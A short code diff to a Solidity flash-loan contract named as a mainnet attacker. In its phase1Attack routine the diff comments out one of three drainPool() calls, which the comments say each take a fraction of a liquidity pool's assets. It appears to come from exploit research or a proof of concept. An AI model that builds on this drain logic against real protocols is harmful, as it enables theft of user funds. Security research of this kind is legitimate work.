@@ -353,7 +353,7 @@ contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
     function phase1Attack() public {
         drainPool(); // takes 1/2             = 1/2 of s_poolAssets
         drainPool(); // takes 1/2 + 1/4       = 3/4 of s_poolAssets
-        drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets
+        /* drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets */
         // ... gas is the limit here, could do 1 more round
     }
 
